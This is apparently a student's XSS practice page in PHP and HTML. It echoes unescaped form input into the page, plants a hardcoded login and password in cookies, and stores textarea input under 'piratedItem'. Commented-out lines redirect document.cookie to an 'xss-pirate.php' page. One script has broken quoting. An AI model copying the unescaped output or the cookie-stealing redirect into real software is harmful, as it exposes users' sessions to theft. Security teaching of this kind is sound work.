<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>XSS Security</title>
        <link rel="stylesheet" href="../style.css">
        <script>
            document.cookie="login=User";
            document.cookie="password=User.uwu34*!";
        </script>
        <?php
            var_dump($_POST);
            $title = "Non sécurisé";
            $result = "";
            if (isset($_POST["keyword"]) && !empty($_POST["keyword"])){
                $title = "Sécurisé";
                $result = "Résultats pour le mot clé " . $_POST["keyword"];
            }
            if (isset($_POST["keyword"]) && !empty($_POST["keyword"])){
                echo '<h2>Site Sécurisé??</h2>';

            }
        ?>
    </head>
    <body class="darkMode">
        <header>
            <h1><?= $title; ?></h1>
            <?php require("../nav.php");?>
        </header>
        <main>
            <form method="GET" action="xss-pirate.php">
                <textarea type="text" name="keyword" rows=4 cols=20></textarea>
                <input type="submit" name="submit" value="Envoyer" />
            </form>
            <section>
                <h2><?= $result; ?></h2>
            </section>
        </main>
        <script>//document.querySelector("section").innerHTML += "<p style='color:red'> Site infecté</p>";</script>
        <script>document.addEventListener("click", ()=>{document.querySelector("section").innerHTML += "document.querySelector("input").value"});</script>
        <script>localStorage.setItem("piratedItem", document.querySelector("textarea").value);</script>            
        <script>//alert(localStorage.getItem("piratedItem"));</script>
        <script>//window.location.replace("xss-pirate.php/?cookie=" + document.cookie);</script>            
        <script>//<img src="https://picsum.photos/300" onerror=''></script>
</body>
</html>